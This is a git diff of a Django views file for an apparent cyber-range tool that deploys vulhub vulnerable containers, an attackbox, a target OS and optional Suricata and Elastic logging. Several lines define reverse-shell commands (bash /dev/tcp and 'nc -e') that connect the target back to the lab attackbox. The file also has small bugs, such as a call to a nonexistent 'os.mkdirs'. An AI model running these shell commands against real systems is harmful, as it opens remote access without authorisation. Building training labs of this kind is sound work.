@@ -1,8 +1,6 @@
 import re
 import os
-#import ast
 import git
-import sys
 import copy
 import time
 import json
@@ -12,16 +10,14 @@ import docker
 import shutil
 import socket
 import psutil
-import signal
 import pickle
 import binascii
 import markdown
-import psycopg2
 import requests
 import ipaddress
 import subprocess
-#import objectpath
 import collections
+import cProfile
 
 
 import networkx as nx
@@ -33,13 +29,7 @@ from .models import *
 from .custom_containers import *
 from markdown_view.views import *
 
-from mysql.connector import connect, Error
-
-from django.http import HttpResponse
-from django.shortcuts import redirect,render
-from django.contrib.auth import login,logout,authenticate
-
-#from threading import Thread
+from django.shortcuts import render
 
 class scenario_template:
     def __init__(self, name):
@@ -49,10 +39,10 @@ class scenario_template:
         self.selected_vulns_child_containers = dict()
         self.selected_custom_containers = []
         self.custom_vulnhub_containers = []
-        self.targetos="targetos:172.18.0.200"
-        self.attackbox="attackbox:172.18.0.157"
-        self.current_external_ip = "172.18.0.11"
-        self.current_internal_ip = "172.19.0.11"
+        self.targetos="targetos:172.28.0.200"
+        self.attackbox="attackbox:172.28.0.157"
+        self.current_external_ip = "172.28.0.11"
+        self.current_internal_ip = "172.29.0.11"
         self.number_of_internal_containers = 0
         self.aux_containers_env = dict()
         self.added_containers = dict()
@@ -65,12 +55,11 @@ class scenario_template:
         self.dockerfile_to_edit = ""
         self.suggested_tag = ""
         self.selected_container = ""
+        self.docker_compose_files = []
 
 current_scenario = scenario_template("current")
 
 loaded_scenario = scenario_template("loaded")
-
-dbs_list = ["mysql", "postgres"]
 
 cve_string = ""
 
@@ -102,11 +91,16 @@ def vulnhubView(request):
     git_url = "https://github.com/vulhub/vulhub.git"
 
     if request.method == "POST":
+    
+        if not os.path.exists(vulnhub_dir):
+            os.mkdirs(vulnhub_dir)
 
         try:
-            git.Repo(vulnhub_dir)
-            g = git.cmd.Git(vulnhub_dir)
-            g.pull()
+            repo = git.Repo(vulnhub_dir)
+            origin = repo.remote(name='origin')
+            origin.fetch()
+            origin_master = origin.refs.master
+            repo.git.reset('--hard', origin_master.commit)
         except git.InvalidGitRepositoryError:
             git.Repo.clone_from(git_url, vulnhub_dir)
 
@@ -141,9 +135,8 @@ def vulnhubView(request):
         for i in cwe_json:
             cwe_dict[i["id"]] = i
 
-        for root, dirs, files in os.walk(vulnuhb_dir):
+        for root, dirs, files in os.walk(vulnhub_dir):
             for dir in dirs:
-                #if dir.lower().__contains__("cve"):
                 match = re.search(r"CVE[-]\d*[-]\d*", dir)
                 if match:
                     cve = match.group()
@@ -229,7 +222,6 @@ def environmentView(request):
             
         for container in current_scenario.selected_custom_containers:
             if container in current_scenario.custom_vulnhub_containers:
-                print(container)
                 dcf_data = yaml_data_from_docker_compose(container)[0]
 
                 for service in dcf_data["services"]: 
@@ -246,24 +238,91 @@ def environmentView(request):
             auto_attack_target = request.POST["auto_attack_target"]
 
             target_os = request.POST["target_os"]
+
+            filebeats = False
+            packetbeats = False
+            suricata = False
+            pcap = False
+
+            if "filebeats" in request.POST:
+                filebeats = True
+
+            if "packetbeats" in request.POST:
+                packetbeats = True
+
+            if "suricata" in request.POST:
+                suricata = True
+
+            if "pcap" in request.POST:
+                pcap = True
+
+            dynamic_containers_sect = header_dc.replace("target_os",target_os)
+
+            if filebeats or packetbeats or suricata:
+
+                dynamic_containers_sect += ek_containers_sect
+
+            if filebeats:
+                dynamic_containers_sect += filebeat_sect
+
+            if packetbeats:
+
+                dynamic_containers_sect += packetbeat_sect
+
+            if suricata :
+                if not filebeats:
+                    dynamic_containers_sect += filebeat_sect
+                
+                dynamic_containers_sect += suricata_sect
+
+            dynamic_containers_sect = dynamic_containers_sect.replace("path_replace",resource_file_path)
+
+            if traffic_target != "":    
+                traffic_generator_cmd = traffic_target.split(" ")
+
+                temp = traffic_generator.replace('traffic_target', traffic_generator_cmd[0]).replace('endpoints', traffic_generator_cmd[1]) 
+
+                temp += f"""
+    depends_on:
+      - elasticsearch
+      - kibana
+      - filebeat
+"""
+                
+                dynamic_containers_sect += temp
+
+            if auto_attack_target != "":
+                auto_attack_cmd = auto_attack_target.split(" ")
+
+                temp = auto_attack.replace('auto_attack_target', auto_attack_cmd[0]).replace('selected_scanners', auto_attack_cmd[1]) 
+
+                temp += f"""
+    depends_on:
+      - elasticsearch
+      - kibana
+      - filebeat
+"""
+
+                dynamic_containers_sect += temp
+         
             
             print("Deployment in Progress")
 
-            deploy_containers(current_scenario, ["uwe_tek_external", "uwe_tek_internal"],traffic_target, auto_attack_target,target_os,replace_subnet_dict=None, user_defined=False)
+            deploy_containers(current_scenario, ["uwe_tek_external", "uwe_tek_internal"],dynamic_containers_sect, pcap, replace_subnet_dict=None, user_defined=False)
 
-            listen_cmd = "/bin/bash -i >& /dev/tcp/172.18.0.157/4242 0>&1"
+            listen_cmd = "/bin/bash -i >& /dev/tcp/172.28.0.157/4242 0>&1"
     
-            if target_os.__contains__("alpine"):
-                listen_cmd = "nc 172.18.0.157 4242 -e /bin/ash"
+            if target_os == "alpine":
+                listen_cmd = "nc 172.28.0.157 4242 -e /bin/ash"
             
-            listen_process = mp.Process(target=listen,args=("0.0.0.0",18200,listen_cmd,target_os))
+            listen_process = mp.Process(target=listen,args=("0.0.0.0",18200,listen_cmd,target_os, "target" ))
             
             listen_process.start()
             
             current_scenario.listen_process_pid = listen_process.pid
 
         if "end_deployment" in request.POST:
-            pid_list = [current_scenario.tshark_process_pid,current_scenario.listen_process_pid]
+            pid_list = [current_scenario.tcpdump_process,current_scenario.listen_process_pid]
             
             for pid in pid_list:
                 p = psutil.Process(pid)
@@ -329,14 +388,14 @@ def environmentView(request):
         if current_scenario.targetos in current_scenario.container_nodes:
             current_scenario.container_nodes.remove(current_scenario.targetos)
 
-        current_scenario.targetos="targetos:172.18.0.200/172.19.0.200"
+        current_scenario.targetos="targetos:172.28.0.200/172.29.0.200"
         current_scenario.connected_containers.append((current_scenario.attackbox,current_scenario.targetos))
     
     else:
         if current_scenario.targetos in current_scenario.container_nodes:
             current_scenario.container_nodes.remove(current_scenario.targetos)
 
-        current_scenario.targetos="targetos:172.18.0.200"
+        current_scenario.targetos="targetos:172.28.0.200"
         current_scenario.connected_containers.append((current_scenario.attackbox,current_scenario.targetos))
 
     previous_container = ""
@@ -348,10 +407,10 @@ def environmentView(request):
 
             for child_container in child_containers:
                 graph_container = "{} - {}".format(container, child_container)
-                container_ip_str = container_to_graph(current_scenario, graph_container, "172.19.0.0/24")
+                container_ip_str = container_to_graph(current_scenario, graph_container, "172.29.0.0/24")
         
         else:
-            container_ip_str = container_to_graph(current_scenario, container, "172.19.0.0/24")
+            container_ip_str = container_to_graph(current_scenario, container, "172.29.0.0/24")
 
         if previous_container != container_ip_str and previous_container != "":
             current_scenario.connected_containers.append((previous_container, container_ip_str))
@@ -367,10 +426,10 @@ def environmentView(request):
 
             for child_container in child_containers:
                 graph_container = "{} - {}".format(container, child_container)
-                container_ip_str = container_to_graph(current_scenario, graph_container, "172.18.0.0/24")
+                container_ip_str = container_to_graph(current_scenario, graph_container, "172.28.0.0/24")
         
         else:
-            container_ip_str = container_to_graph(current_scenario, container, "172.18.0.0/24")
+            container_ip_str = container_to_graph(current_scenario, container, "172.28.0.0/24")
 
         if previous_container != container_ip_str and previous_container != "":
             current_scenario.connected_containers.append((previous_container, container_ip_str))
@@ -399,22 +458,22 @@ def environmentView(request):
                 remove_tuple = True
 
             if container_key_value in external_containers.keys():
-                if container_ip_value.__contains__("172.19"):
+                if container_ip_value.__contains__("172.29"):
                     current_scenario.container_nodes.remove(container)
                     remove_tuple = True
 
             if container_key_value in internal_containers.keys():
-                if container_ip_value.__contains__("172.18"):
+                if container_ip_value.__contains__("172.28"):
                     current_scenario.container_nodes.remove(container)
                     remove_tuple = True
 
             if current_scenario.number_of_internal_containers >= 1:
-                if container_key_value == "targetos" and container_ip_value == "172.18.0.200":
+                if container_key_value == "targetos" and container_ip_value == "172.28.0.200":
                     current_scenario.container_nodes.remove(container)
                     remove_tuple = True
 
             if current_scenario.number_of_internal_containers == 0:
-                if container_key_value == "targetos" and container_ip_value == "172.18.0.200/172.19.0.200":
+                if container_key_value == "targetos" and container_ip_value == "172.28.0.200/172.29.0.200":
                     current_scenario.container_nodes.remove(container)
                     remove_tuple = True
 
@@ -439,92 +498,13 @@ def environmentView(request):
 
 def userDefinedView(request):
 
-    pkl_files = os.listdir("{}/User_Defined_Scenarios".format(resource_file_path))
+    pkl_files = [x for x in os.listdir("{}/User_Defined_Scenarios".format(resource_file_path)) if x.endswith(".pkl")]
 
     context = {
         'pkl_files':pkl_files
     }
 
     return render(request,'GUI/userDefined.html',context)
-
-
-def userDefinedEnviromentView(request):
-    global loaded_scenario
-
-    running_container_info = "\n"
-
-    if request.method == "POST":
-        
-        if loaded_scenario.name == "loaded":
-            selected_scenario = request.POST["selected_scenario"]
-
-            pkl_file = "{}/User_Defined_Scenarios/{}".format(resource_file_path,selected_scenario)
-
-            with open(pkl_file, 'rb') as pkl_dump:
-                loaded_scenario = pickle.load(pkl_dump)
-
-        required_networks = ["uwe_tek_external_usd", "uwe_tek_internal_usd"]
-
-        replace_subnet_dict = dict ()
-
-        for req_network in required_networks:
-            req_network_subnet = sub_network_check(req_network)
-            replace_subnet = re.match(r"\d{1,3}.\d{1,3}",req_network_subnet)
-            replace_subnet_dict[req_network] = replace_subnet.group()
-
-        for i in range(0,len(loaded_scenario.connected_containers)):
-            temp0 = loaded_scenario.connected_containers[i][0].replace("172.18", replace_subnet_dict["uwe_tek_external_usd"]).replace("172.19", replace_subnet_dict["uwe_tek_internal_usd"])
-            temp1 = loaded_scenario.connected_containers[i][1].replace("172.18", replace_subnet_dict["uwe_tek_external_usd"]).replace("172.19", replace_subnet_dict["uwe_tek_internal_usd"])
-
-            loaded_scenario.connected_containers[i] = (temp0,temp1)
-
-        for i in range(0,len(loaded_scenario.container_nodes)):
-            loaded_scenario.container_nodes[i] = loaded_scenario.container_nodes[i].replace("172.18", replace_subnet_dict["uwe_tek_external_usd"]).replace("172.19", replace_subnet_dict["uwe_tek_internal_usd"])
-
-        graph = create_Network_Graph(loaded_scenario.connected_containers,loaded_scenario.container_nodes)
-
-        if "deploy" in request.POST:
-
-            print("Deployment in Progress")
-
-            traffic_target = request.POST["traffic_target"]
-            
-            auto_attack_target = request.POST["auto_attack_target"]
-
-            target_os = request.POST["target_os"]
-            
-            deploy_containers(loaded_scenario, required_networks,traffic_target, auto_attack_target,target_os, replace_subnet_dict, user_defined=True)
-
-            listen_cmd = "/bin/bash -i >& /dev/tcp/172.20.0.157/4242 0>&1"
-    
-            if target_os.__contains__("alpine"):
-                listen_cmd = "nc 172.20.0.157 4242 -e /bin/ash"
-            
-            listen_process = mp.Process(target=listen,args=("0.0.0.0",18201,listen_cmd,target_os))
-            
-            listen_process.start()
-            
-            loaded_scenario.listen_process_pid = listen_process.pid
-
-        if "end_deployment" in request.POST:
-            pid_list = [loaded_scenario.tshark_process_pid,loaded_scenario.listen_process_pid]
-            
-            for pid in pid_list:
-                p = psutil.Process(pid)
-                p.terminate()
-            
-            output_fldr = "{}output_files/{}_{}".format(dir_path.split("GUI")[0],loaded_scenario.name,time.strftime("%d-%m-%Y_%H%M"))
-
-            for i in range(0,len(loaded_scenario.container_logs_to_recover)):
-                loaded_scenario.container_logs_to_recover[i] = "{}_{}".format(loaded_scenario.name, loaded_scenario.container_logs_to_recover[i].lower())
-
-            log_clean_up("{}_{}".format(loaded_scenario.name,pcap_file),loaded_scenario.container_logs_to_recover,"logfiles/{}".format(loaded_scenario.name),output_fldr)
-
-    context = {
-        'graph':graph
-    }
-
-    return render(request,'GUI/userDefinedEnvironment.html',context)
 
 
 def cveView(request):
@@ -722,9 +702,6 @@ def dockerfileEditingView(request):
     for container in current_scenario.selected_vulns:
         pp_containers[container.split("vulnhub")[1]] = container
     
-    #for container in current_scenario.selected_custom_containers:
-    #    pp_containers[container] = os.path.join(resource_file_path,"Custom_Containers/{}".format(container))
-    
     if request.method == "POST":
 
         if "selected_container" in request.POST:
@@ -737,7 +714,6 @@ def dockerfileEditingView(request):
             files = os.listdir(dockerfile_path)
 
             for f in files:
-                print(f)
                 if f.lower().__contains__("dockerfile"):
                     with open(os.path.join(dockerfile_path,f)) as d_file:
                         docker_file = "#Dockerfile loaded from {}\n".format(dockerfile_path)
@@ -745,7 +721,7 @@ def dockerfileEditingView(request):
 
                 if f.lower().__contains__("compose"):
                     with open(os.path.join(dockerfile_path,f)) as dc_file:
-                        docker_compose_file = "{} - Docker Compose file\n".format(container)
+                        docker_compose_file = "{} - docker compose file\n".format(container)
                         docker_compose_file += dc_file.read()
 
             suggested_tag = suggested_tag.replace("container",container.replace("/","_")[1:])
@@ -768,8 +744,6 @@ def dockerfileEditingView(request):
                 new_dockerfile.write(file_data)
 
             shutil.copytree(old_container_path, new_container_path, dirs_exist_ok=True)
-
-            #with open (os.path.join(resource_file_path,"Custom_Containers/user_defined_containers.json")) as json_dump_file:
 
             saved_in_location = "A copy of {} has been moved to {} - Complete with the edited dockerfile".format(current_scenario.selected_container, new_container_path)
 
@@ -848,21 +822,20 @@ def service_check(address):
     return 
 
 
-def deploy_containers(scenario, required_networks,traffic_target, auto_attack_target,target_os, replace_subnet_dict, user_defined):
+def deploy_containers(scenario, required_networks, dynamic_containers_sect, pcap, replace_subnet_dict, user_defined):
 
-    running_container_info = "\n"
-
-    for dbs in dbs_list:
-        if dbs in scenario.assigned_containers.keys():
-            dbc = custom_containers[dbs]
-            running_container_info += custom_container_setup(dbc[0],dbc[1],dbc[2],dbc[3])
+    custom_dc_services = dict()
+    
+    running_container_info = ""
 
     for req_network in required_networks:
         req_network_subnet = sub_network_check(req_network)
 
     for custom_container in scenario.assigned_containers:
-        if custom_container in dbs_list:
-            continue
+        print(custom_container)
+            
+        if custom_container == "auto_attack" or custom_container == "random_traffic":
+        	continue
 
         if custom_container in aux_containers.keys():
             selected_dict = aux_containers
@@ -871,27 +844,26 @@ def deploy_containers(scenario, required_networks,traffic_target, auto_attack_ta
             selected_dict = custom_containers
 
         if re.match(r"[/]\w*[/]",custom_container) or re.match(r"\w*[_]",custom_container):
-            print("REEEEEE")
 
             parent_container = custom_container.split(" ")[0]
 
             if os.path.isdir("{}{}".format(vulnhub_dir,parent_container)) and "{}{}".format(vulnhub_dir,parent_container) in scenario.selected_vulns:
-                print("vulnhub")
-                running_container_info += docker_compose_container_setup(scenario,parent_container)
+                custom_dc_services.update(docker_compose_container_setup(scenario,parent_container))
                 continue
             if os.path.isdir("{}/Custom_Containers/custom_vulnhub_containers/{}".format(resource_file_path,parent_container)) and parent_container in scenario.selected_custom_containers:
-                print("custom")
-                running_container_info += docker_compose_container_setup(scenario,parent_container)
+                custom_dc_services.update(docker_compose_container_setup(scenario,parent_container))
                 continue
 
         sc = selected_dict[custom_container]
+
+        print(sc)
 
         container_update=sc[0]
 
         original_ipv4 = container_update.ipv4_addr
         container_update.ipv4_addr = scenario.assigned_containers[custom_container]
         if user_defined:
-            container_update.ipv4_addr = container_update.ipv4_addr.replace("172.18", replace_subnet_dict["uwe_tek_external_usd"]).replace("172.19", replace_subnet_dict["uwe_tek_internal_usd"])
+            container_update.ipv4_addr = container_update.ipv4_addr.replace("172.28", replace_subnet_dict["uwe_tek_external_usd"]).replace("172.29", replace_subnet_dict["uwe_tek_internal_usd"])
 
         if container_update.svc_check != None:
             original_svc_check = container_update.svc_check
@@ -903,17 +875,7 @@ def deploy_containers(scenario, required_networks,traffic_target, auto_attack_ta
                 if user_defined:
                     sc[2][i] = sc[2][i].replace("uwe_tek_external","uwe_tek_external_usd").replace("uwe_tek_internal","uwe_tek_internal_usd")
 
-        #custom_container_setup(Container, use_sdk, subprocess_list=[], on_running_cmds=[]):
 
-        if custom_container == "random_traffic":
-            container_update.command = traffic_target
-            
-        if custom_container == "auto_attack":
-
-            scenario.container_logs_to_recover.append("auto_attack")
-
-            cmd_args = auto_attack_target.split(" ")
-            container_update.command = "-target {} -scanners {}".format(cmd_args[0],cmd_args[1])
 
         if user_defined:
             for i in range(0, len(sc[2])):
@@ -922,50 +884,43 @@ def deploy_containers(scenario, required_networks,traffic_target, auto_attack_ta
             container_update.name = "{}_{}".format(scenario.name,container_update.name)
 
         running_container_info += custom_container_setup(sc[0],sc[1],sc[2],sc[3])
+    
+    dc_file_content = (
+        dynamic_containers_sect + 
+        tail_dc
+    )
+    
+    dc_file = "{}/Custom_Containers/required_containers/docker-compose.yml".format(resource_file_path)
+    
+    with open(dc_file,'w') as dcf:
+        dcf.write(dc_file_content)
+        
+    with open(dc_file) as dcf:
+        dcf_data = yaml.safe_load(dcf)
+        
+    for service in custom_dc_services:
+    	dcf_data["services"][service] = custom_dc_services[service]
+    	
+    with open(dc_file,'w') as dcf_edited:
+        yaml.safe_dump(dcf_data, dcf_edited)
 
-    # Done last to avoid polluting logs with setup connections etc
-    target_os_container_name = ""
+    docker_compose_cmd = "docker compose -f {} up -d".format(dc_file)
+    
+    dc_process = subprocess.run(['bash', '-c', docker_compose_cmd], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
+
+    #print(dc_process.stderr)
+    #print(dc_process.stdout)
+
     for k, v in required_containers.items():
         container_update=v[0]
-
-        if k == "target":
-            
-            container_update.image = "dh157/goibhniu:{}".format(target_os)
-
-        if user_defined:
-            if container_update.ipv4_addr != None:
-                container_update.ipv4_addr = container_update.ipv4_addr.replace("172.18", replace_subnet_dict["uwe_tek_external_usd"]).replace("172.19", replace_subnet_dict["uwe_tek_internal_usd"])
-
-            for i in range(0, len(v[2])):
-                v[2][i] = v[2][i].replace("--name {}".format(container_update.name), "--name {}_{}  --hostname {}_{}".format(scenario.name,container_update.name,scenario.name,container_update.name))
-
-                if not os.path.isdir("{}/logfiles/{}".format(resource_file_path,scenario.name)):
-                    os.makedirs("{}/logfiles/{}".format(resource_file_path,scenario.name))
-
-                v[2][i] = v[2][i].replace("logfiles","logfiles/{}".format(scenario.name))
-
-            container_update.name = "{}_{}".format(scenario.name,container_update.name)
-
-        running_container_info += custom_container_setup(v[0],v[1],v[2],v[3])
-
-        if k == "target":
-            if target_os.__contains__("ubuntu"):
-                cmd_create = api_client.exec_create(container_update.name, "/usr/sbin/sshd", user="root")
         
-                cmd_execute = api_client.exec_start(cmd_create, detach=True)
-
-            if scenario.number_of_internal_containers >= 1:
-                if user_defined:
-                    docker_client.networks.get("uwe_tek_internal_usd").connect(container_update.name,ipv4_address="{}.0.200".format(replace_subnet_dict["uwe_tek_internal_usd"]))
-                else:
-                    docker_client.networks.get("uwe_tek_internal").connect(container_update.name,ipv4_address="172.19.0.200")
+        running_container_info += custom_container_setup(v[0],v[1],v[2],v[3])
 
         if k == "attackbox":
             # Testing something - but does also fix an issue with patator - So keeping until I fix the image
             cmd_create = api_client.exec_create(container_update.name, 'sed -i "s/fp.setopt(pycurl.RESOLVE/#fp.setopt(pycurl.RESOLVE/g" /usr/bin/patator')
             
             cmd_execute = api_client.exec_start(cmd_create, detach=True)
-
 
     cleanup_set = set(running_container_info.replace("None", "").split("\n"))
 
@@ -974,82 +929,93 @@ def deploy_containers(scenario, required_networks,traffic_target, auto_attack_ta
         print(string)
     print("----------------------------------------------------------------")
     
+    if pcap:
 
-    if user_defined:
+        if user_defined:
 
-        capture_output = "{}/{}_{}".format(resource_file_path,scenario.name,pcap_file)
+            capture_output = "{}/{}_{}".format(resource_file_path,scenario.name,pcap_file)
 
-        os.umask(0)
-    
-        if not os.path.exists(capture_output):
-            os.mknod(capture_output, mode = 0o666)
-
-        # TODO: Add in toggle / switch for this
-
-        tshark_process = subprocess.Popen(['/usr/bin/tshark', '-i', 'any', '-w', capture_output, 'src', 'net', '{}.0.0/15'.format(replace_subnet_dict["uwe_tek_external_usd"]), 'and', 'dst', 'net', '{}.0.0/15'.format(replace_subnet_dict["uwe_tek_external_usd"])],stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
-
-        #tshark_process = subprocess.Popen(['/usr/bin/tshark', '-i', 'any', '-w', capture_output, 'src', 'net', '{}.0.0/15'.format(replace_subnet_dict["uwe_tek_external_usd"]), 'and', 'dst', 'net', '{}.0.0/15'.format(replace_subnet_dict["uwe_tek_external_usd"]), 'and', 'host', 'not', '{}.0.10'.format(replace_subnet_dict["uwe_tek_external_usd"]), 'and', 'host', 'not', '{}.0.11'.format(replace_subnet_dict["uwe_tek_external_usd"]), 'and', 'host', 'not', '{}.0.12'.format(replace_subnet_dict["uwe_tek_external_usd"])],stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
-
-    else:
-
-        capture_output = "{}/{}".format(resource_file_path,pcap_file)
-
-        os.umask(0)
-    
-        if not os.path.exists(capture_output):
-            os.mknod(capture_output, mode = 0o666)
-
-        tshark_process = subprocess.Popen(['/usr/bin/tshark', '-i', 'any', '-w', capture_output, 'src', 'net', '172.18.0.0/15', 'and', 'dst', 'net', '172.18.0.0/15'],stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
+            os.umask(0)
         
-        #tshark_process = subprocess.Popen(['/usr/bin/tshark', '-i', 'any', '-w', capture_output, 'src', 'net', '172.18.0.0/15', 'and', 'dst', 'net', '172.18.0.0/15', 'and', 'host', 'not', '172.18.0.10', 'and', 'host', 'not', '172.18.0.11', 'and', 'host', 'not', '172.18.0.12'],stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
+            if not os.path.exists(capture_output):
+                os.mknod(capture_output, mode = 0o666)
+            
+            tcpdump_process = subprocess.Popen(['tcpdump', '-i', 'any', '-w', capture_output, 'src', 'net', '{}.0.0/15'.format(replace_subnet_dict["uwe_tek_external_usd"]), 'and', 'dst', 'net', '{}.0.0/15'.format(replace_subnet_dict["uwe_tek_external_usd"])],stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
 
-    scenario.tshark_process_pid = tshark_process.pid
+        else:
+
+            capture_output = "{}/{}".format(resource_file_path,pcap_file)
+
+            os.umask(0)
+        
+            if not os.path.exists(capture_output):
+                os.mknod(capture_output, mode = 0o666)
+
+            tcpdump_process = subprocess.Popen(['tcpdump', '-i', 'any', '-w', capture_output, 'src', 'net', '172.28.0.0/15', 'and', 'dst', 'net', '172.28.0.0/15'],stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
+            
+        scenario.tcpdump_process = tcpdump_process.pid
 
 
 def docker_compose_container_setup(scenario,container):
-    
-    running_container_info = ""
 
     dcf_data = yaml_data_from_docker_compose(container)[0]
     original_docker_compose_file = yaml_data_from_docker_compose(container)[1]
 
+    running_container_info = ""
+        
     dcf_dir_path = os.path.dirname(original_docker_compose_file)
-    dcf_filename = os.path.basename(original_docker_compose_file)
+    #dcf_filename = os.path.basename(original_docker_compose_file)
 
-    dcf_original_data = copy.copy(dcf_data)
-
-    # Avoid overwrite of original in loop
-    if not os.path.isfile(os.path.join(dcf_dir_path, "dcf_original.yml")):
-        shutil.copy2(original_docker_compose_file,os.path.join(dcf_dir_path, "dcf_original.yml"))
+    #dcf_original_data = copy.copy(dcf_data)
 
     for service in dcf_data["services"]:
 
         temp = "{} - {}".format(container,service)
-        
-        ipv4_addr = scenario.assigned_containers[temp]
 
+        if "networks" not in dcf_data["services"][service]:
+        
+            ipv4_addr = scenario.assigned_containers[temp]
+
+            dcf_data["services"][service]["networks"] = {"network":{"ipv4_address":ipv4_addr}}
+
+            dcf_data["networks"] = {"network":{"name":"uwe_tek_external", "external": "true"}}
+        
+        else:
+            ipv4_addr = dcf_data["services"][service]["networks"]["network"]["ipv4_address"]
+        
+            
         running_container_info += "{} is up and running and can be accessed on {}\n".format(temp,ipv4_addr)
 
-        dcf_data["services"][service]["networks"] = {"network":{"ipv4_address":ipv4_addr}}
+        if "ports" in dcf_data["services"][service]:
+            del dcf_data["services"][service]["ports"]
 
-        dcf_data["networks"] = {"network":{"name":"uwe_tek_external"}}
+        if "image" in dcf_data["services"][service]:
+            local_docker_check(dcf_data["services"][service]["image"])
 
-    with open(original_docker_compose_file,'w') as dcf_edited:
-        yaml.safe_dump(dcf_data, dcf_edited)
+        if "volumes" in dcf_data["services"][service]:
+            volumes = dcf_data["services"][service]["volumes"]
+            path_corrected = [v.replace("./",dcf_dir_path + "/") for v in volumes]
+            dcf_data["services"][service]["volumes"] = path_corrected
 
-    docker_compose_cmd = "docker compose --project-directory {} up -d".format(dcf_dir_path)
+        if "build" in dcf_data["services"][service]:
+            
+            build = dcf_data["services"][service]["build"]
 
-    subprocess.run(['bash', '-c', docker_compose_cmd], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
+            if build == ".":
+                dcf_data["services"][service]["build"] = dcf_dir_path + "/"
 
-    os.remove(original_docker_compose_file)
+            else:
+                path_corrected = build.replace("./",dcf_dir_path + "/")
+                dcf_data["services"][service]["build"] = path_corrected
 
-    os.rename(os.path.join(dcf_dir_path, "dcf_original.yml"), original_docker_compose_file)
+    return dcf_data["services"]
 
-    return running_container_info
 
 
 def custom_container_setup(Container, use_sdk, subprocess_list=[], on_running_cmds=[]):
     network_list = api_client.networks()
+
+    print(f"Container Setup : {Container.name}")
 
     if container_check(Container.name) != "running":
 
@@ -1067,6 +1033,14 @@ def custom_container_setup(Container, use_sdk, subprocess_list=[], on_running_cm
                 subprocess.Popen(['gnome-terminal', '-x', 'bash', '-c', subprocess_cmd], stderr=subprocess.STDOUT, stdout=subprocess.PIPE)
 
         if use_sdk:
+
+            if Container.name == "elasticsearch" or Container.name == "kibana":
+                cpu_quota=100000
+                mem_limit='2g'
+            else:
+                cpu_quota=50000
+                mem_limit='1g'
+
             container = docker_client.containers.create(Container.image,
             detach=True, 
             name=Container.name,
@@ -1074,7 +1048,10 @@ def custom_container_setup(Container, use_sdk, subprocess_list=[], on_running_cm
             command=Container.command, 
             environment=Container.environment,
             volumes=Container.volumes,
-            cap_add=Container.capabilities)
+            cap_add=Container.capabilities,
+            cpu_quota=cpu_quota,  # 50% of a single CPU core
+            mem_limit='1g'    # 1 GB of memory
+            )
 
             for network in network_list:
                 if network["Name"].__contains__("uwe"):
@@ -1090,38 +1067,14 @@ def custom_container_setup(Container, use_sdk, subprocess_list=[], on_running_cm
 
         # Wait for container(s) to come online
         while container_status != "running":
-            time.sleep(5)
+            time.sleep(10)
             container_status = container_check(Container.name)
-        
-        if Container.name.lower() in dbs_list:
-            no_connection = True
-            # DBS connection check
-            while no_connection:
-                time.sleep(5)
-                if Container.name.lower() == "mysql":
-                    try:
-                        with connect(
-                            host=Container.ipv4_addr,
-                            user="test",
-                            password="ing",
-                        ) as connection:
-                            break
-                    except Error as e:
-                        print(str(e))
-                        if "Access denied for user" in str(e):
-                            no_connection = False
-                
-                if Container.name.lower() == "postgres":
-                    try:
-                        conn = psycopg2.connect(
-                                host=Container.ipv4_addr,
-                                database="test",
-                                user="test",
-                                password="ing")
-                    except Exception as e:
-                        if "authentication failed" in str(e):
-                            no_connection = False
 
+            if container_status == "created":
+                container = docker_client.containers.get(Container.name)
+                container.stop()
+                container.remove()
+                custom_container_setup(Container, use_sdk, subprocess_list, on_running_cmds)
 
         if Container.svc_check != None:
             service_check(Container.svc_check)
@@ -1141,8 +1094,6 @@ def yaml_data_from_docker_compose(container):
     docker_compose_file = ""
 
     files = ""
-
-    print(container)
 
     if os.path.isdir("{}{}".format(vulnhub_dir,container)):
 
@@ -1175,11 +1126,11 @@ def container_to_graph(scenario,graph_container,network):
         container_ip_str = "{}:{}".format(graph_container,scenario.assigned_containers[graph_container])
 
     else:
-        if network == "172.18.0.0/24":
+        if network == "172.28.0.0/24":
             scenario.current_external_ip = str(ipaddress.IPv4Address(scenario.current_external_ip) +1)
             ip_assignment = scenario.current_external_ip
         
-        if network == "172.19.0.0/24":
+        if network == "172.29.0.0/24":
             scenario.current_internal_ip = str(ipaddress.IPv4Address(scenario.current_internal_ip) +1)
             ip_assignment = scenario.current_internal_ip
         
@@ -1189,7 +1140,7 @@ def container_to_graph(scenario,graph_container,network):
         
     scenario.connected_containers.append((scenario.targetos, container_ip_str))
 
-    if network == "172.18.0.0/24":
+    if network == "172.28.0.0/24":
         scenario.connected_containers.append((scenario.attackbox, container_ip_str))
 
     return container_ip_str
@@ -1197,7 +1148,7 @@ def container_to_graph(scenario,graph_container,network):
 
 def network_create(req_network, network_subnets):
 
-    count = 18
+    count = 28
     
     while True:
         req_network_subnet = "172.{}.0.0/24".format(str(count))
@@ -1254,8 +1205,6 @@ def create_Network_Graph(connected_containers,container_nodes):
 
     G = nx.Graph()
 
-    #edges = nx.read_edgelist(edge_input)
-
     G.add_edges_from(edge_input)
     G.add_nodes_from(node_input)
 
@@ -1299,14 +1248,6 @@ def create_Network_Graph(connected_containers,container_nodes):
             size=10,
             line_width=2))
 
-    # node_adjacencies = []
-    # node_text = []
-    # for node, adjacencies in enumerate(G.adjacency()):
-    #     node_adjacencies.append(len(adjacencies[1]))
-    #     node_text.append('# of connections: '+str(len(adjacencies[1])))
-
-    # node_trace.marker.color = node_adjacencies
-    # node_trace.text = node_text
 
     fig = go.Figure(data=[edge_trace, node_trace],
                 layout=go.Layout(
@@ -1340,7 +1281,6 @@ def log_clean_up(pcap_file_to_cleanup,container_logs_to_recover, suricata_log_di
         content = f.read()
 
     hex_str = binascii.hexlify(content).decode('ascii')
-
     rpl_hex_str = hex_str.replace("ac120001","ac12009d")
 
     file_str = binascii.unhexlify(rpl_hex_str)
@@ -1360,8 +1300,8 @@ def log_clean_up(pcap_file_to_cleanup,container_logs_to_recover, suricata_log_di
             with open(file, 'r') as file_in :
                 filedata = file_in.read()
 
-            filedata = filedata.replace('"172.18.0.1"', '"172.18.0.157"')
-            filedata = filedata.replace('172.18.0.1:', '172.18.0.157:')
+            filedata = filedata.replace('"172.28.0.1"', '"172.28.0.157"')
